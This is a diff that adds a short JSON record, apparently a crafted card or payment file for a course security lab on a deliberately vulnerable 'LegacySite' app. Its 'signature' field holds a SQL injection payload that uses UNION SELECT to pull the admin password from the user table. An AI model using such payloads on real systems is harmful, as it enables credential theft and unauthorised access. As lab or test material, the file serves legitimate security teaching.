@@ -1,0 +1,8 @@
+{
+    "merchant_id" : "nyu_ID",
+    "customer_id": "admin",
+     "total_value": "69420", 
+     "records": 
+     [{"record_type": "amount_change",
+     "amount_added": 9000,
+     "signature": "[ ''' UNION SELECT password FROM LegacySite_user WHERE LegacySite_user.username='admin';--' ]"}]}
